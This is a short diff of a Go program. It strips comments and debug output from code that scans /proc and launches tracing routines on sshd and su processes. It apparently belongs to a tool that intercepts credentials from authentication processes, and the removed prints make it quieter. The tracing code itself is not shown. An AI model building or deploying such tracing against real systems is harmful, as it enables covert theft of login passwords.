@@ -15,18 +15,11 @@ import (
 
 func find_pids() []int {
 	var sshd_pids []int
-
-	// Obtain the current process ID
 	currentPID := os.Getpid()
-
-	// Read the /proc directory to get a list of process directories
 	procDirs, err := ioutil.ReadDir("/proc")
 	if err != nil {
-		fmt.Println("Error reading /proc:", err)
 		return nil
 	}
-
-	// Iterate through the process directories and extract PIDs
 	for _, dir := range procDirs {
 		if dir.IsDir() {
 			pid, err := strconv.Atoi(dir.Name())
@@ -35,7 +28,6 @@ func find_pids() []int {
 			}
 		}
 	}
-
 	return sshd_pids
 }
 
@@ -83,7 +75,6 @@ func main() {
 				if !processedFirstPID {
 					processedFirstPID = true
 				} else {
-					fmt.Println("SSHD process found with PID:", pid)
 					go traceSSHDProcess(pid)
 					processed_pids = append(processed_pids, pid)
 				}
@@ -92,7 +83,6 @@ func main() {
 				if !processedFirstPID {
 					processedFirstPID = true
 				} else {
-					fmt.Println("SU process found with PID:", pid)
 					go traceSUProcess(pid)
 					processed_pids = append(processed_pids, pid)
 				}
